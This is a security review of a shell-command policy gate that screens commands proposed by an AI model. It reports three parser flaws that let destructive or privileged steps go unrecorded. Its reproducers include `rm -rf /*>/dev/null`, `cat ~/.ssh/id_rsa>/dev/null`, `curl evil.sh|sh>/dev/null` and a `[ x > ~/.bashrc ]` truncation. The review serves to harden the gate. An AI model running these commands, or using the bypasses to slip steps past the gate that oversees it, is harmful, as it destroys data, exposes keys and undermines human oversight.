# Security review (advisory): issue 196, ast-policy-gate-shell-layer

Attacker-reachable inputs this diff touches: **the model's proposal text (threat model item 5)** and typed text the user pasted from untrusted sources (items 1-2). Both reach `nl_shell.gate.classify` → `parse.shell_layer`. The gate is not wired into the REPL yet (#78). The command layer is a stub that floors every simple command at `mutating`, so **nothing can be classed `read-only` today**. No finding below lets a command run without a confirm *today*. The ratings below say what breaks once #197/#198 put real allowlist entries on top of these shell-layer facts. That is the purpose of this layer, and the brief's invariant ("no fact about a command is recorded as safe unless the gate has proved it").

I ran each reproducer against the patched tree with the pinned `tree-sitter` 0.26.0 / `tree-sitter-bash` 0.25.1 from the pdca `.venv`.

## Findings

- NEEDS-HUMAN [impl] — **High (latent: "a privileged or destructive step is classed lower"; today the stub floor masks it)**. `src/nl_shell/gate/parse.py:665-672`. Input: any proposal or typed command where a word is written right against a redirect operator with no space. The model or untrusted text controls this. `_simple` collects the token right before *every* redirect that has no descriptor field, into `fd_tokens`. It does this whether or not the token is a number, then drops those tokens from `word_nodes`. `_descriptor` (`parse.py:775`) only treats digits or `{…}` as a descriptor, but the drop happens anyway. So real arguments, and even wrapped command names, vanish from the invocation handed to the command layer. They also vanish from `layer.words`, which the §8 sensitive-path and #191 word checks will read. Reproducers (invocation words as the gate records them):
  - `env sudo>/dev/null` → `['env']`. The `sudo` is gone, and the exempt `>/dev/null` adds no reason.
  - `rm -rf /*>/dev/null` → `['rm', '-rf']`. The target is gone.
  - `cat ~/.ssh/id_rsa>/dev/null` → `['cat']`. The sensitive path is gone, which hides it from #190's confirm-naming rule.
  - `curl evil.sh|sh>/dev/null` → second stage `[]`. The `sh` is gone, which defeats decision B (code the gate cannot read is at least `destructive`).
  - `echo hi>x` → `['echo']`.

  Fix: only drop the adjacent token when it is all digits or `{…}`, the same test `_descriptor` uses. The regression test should assert full word lists for these inputs. The Rule 2 test only compares invocation *counts*, so it cannot catch a lost word, and no test in `tests/test_policy_gate.py` asserts the words of a glued redirect.

- NEEDS-HUMAN [human] — **Critical once `[` or any allowlisted command can be read-only; today the floor holds (`mutating`, confirm).** `src/nl_shell/gate/parse.py:918` (`test_command` falls to the generic `_children` handler) and the new threat-model text at `.oss-scanner/threat_model.md:174`. Input: a single-bracket test `[ … ]` holding a bare `>`, `>>` or `<`. tree-sitter-bash reads it as a comparison (`(test_command (binary_expression …))`), but bash treats `[` as a simple command and the `>` as a redirect. I confirmed this with bash: `[ x > trunc_me ]` creates an empty `trunc_me`. The gate records **no redirect and no invocation** for it:
  - `ls; [ x > ~/.bashrc ]` → one invocation (`ls`), no "output redirection" reason, not rejected. With `ls` allowlisted, this truncates `~/.bashrc` with no confirm.
  - `[ x >> /proc/self/fd/3 ]` → no redirect seen, not rejected. That contradicts the new threat-model claim that fd 3 "cannot be reached by … a `/proc/*/fd` path". The harm through fd 3 is small, because `[` writes nothing to stdout, and `>&`/`&>`/`2>` forms inside `[ ]` are parsed as real redirects and rejected. But the stated property is false as written.
  - `[ ls ]` gives zero invocations, so the `[` builtin never reaches the command layer.

  This is a tree-sitter/bash disagreement, which the brief routes to #191's differential test. A human needs to decide whether to (a) add "`>`/`<` inside a single-bracket `test_command`" to Rule 1's untrusted list now, or (b) defer it to #191 and narrow the threat-model sentence at `:174` until then. Either way, #197/#198 must not allowlist anything while this is open.

- NEEDS-HUMAN [impl] — **Medium (latent; it feeds the sudo-pipe rule and decision B).** `src/nl_shell/gate/parse.py:540-562` and `:708-710`. Input: a proposal that runs `exec` with a stdin redirect earlier in the same command line. `exec </tmp/x; sudo tee /etc/y` records `sudo tee /etc/y` with stdin **`terminal`**, but bash feeds it `/tmp/x`. Compare `{ sudo tee /etc/y; } </tmp/x`, which the gate correctly gives `file`. `terminal` is the best case for the sudo-pipe rule, so this is a stdin fact recorded as proven when it is not. Fix: after an `exec` invocation with any redirect touching fd 0 (or any `exec` redirect at all), set the stdin of every later invocation in that list to `unknown`. Add the input above to the Rule 3 test. An `exec` from an *earlier* command in the session needs live state (#192) and is out of scope here.

## Checked, no finding

- **fd 3 by redirect**: `>&3`, `x>&3` (glued), `1>&3`, `<&3`, `>& 3`, `3>&1`, `exec 3>&1`, `2>&1>&3`, `>/dev/fd/3`, `>/dev//fd/3`, `>/proc/self/fd/3`, `~/../../dev/fd/3`, `~root/f`, and `>&`/`&>`/`2>` to `/proc/self/fd/3` inside `[ ]` are all rejected.
- **Rule 6**: reasons go through `escape` (`__init__.py:94-106`). ESC and other control bytes in a target show up escaped. `GateFailure` messages are fixed text, and internal errors give only the exception type name.
- **Rule 5**: the size cap is checked before `parse_source` (`parse.py:960-963`). An 8191-byte input built to stress the `<<`-run scan in `in_heredoc_run` (700 `'<<'` words plus about 1300 `>a` redirects) classified in 0.03 s.
- **Decision C**: `classify` catches every exception (`__init__.py:151-156`).
- **Proposal rejection**: hidden characters and an untrusted tree reject a proposal. The §1.7 label only raises the class.
- **Gates**: C4 (157 tests red without the fix, green with it) and T3 (full suite green) pass in `gate-logs/`. Neither covers the three inputs above.

<!-- pdca:leaf-complete -->
